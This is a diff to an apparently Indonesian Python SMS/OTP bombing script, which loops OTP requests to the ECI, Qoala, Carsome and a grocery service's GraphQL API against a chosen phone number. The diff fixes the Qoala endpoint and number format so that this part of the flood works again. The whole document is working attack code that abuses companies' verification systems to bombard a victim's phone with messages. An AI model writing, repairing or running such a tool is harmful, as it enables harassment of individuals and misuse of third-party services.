@@ -102,7 +102,7 @@ headers_eci = {
 "Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 headers_qoala = {
 'Host': 'api.qoalaplus.com',
-'content-length': '17',
+'content-length': '17',                                                                                                              
 'accept': 'application/json, text/plain, */*',
 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
 'content-type': 'application/json',
@@ -148,7 +148,7 @@ headers_carsome = {
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 # Data
 data_eci = json.dumps({"identity":"0"+nomer})
-data_qoala = json.dumps({"channel":nomer})
+data_qoala = json.dumps({"channel":"+62"+nomer})
 data_sayur = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomer},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
 data_carsome = json.dumps({"username":nomer,"optType":1})
 
@@ -165,7 +165,7 @@ for k in range(jumlah):
     print(f"{M}--> MAAF SMS ECI GAGAL",k)
 for k in range(jumlah):
   k += 1
-  pos_qoala = requests.post("https://api.qoala.app/api/registrations",headers=headers_qoala,data=data_qoala).text
+  pos_qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/otp/+62"+nomer,headers=headers_qoala,data=data_qoala).text
   if "200" in pos_qoala:
     time.sleep(3)
     print(f"{H}____________________________________________")
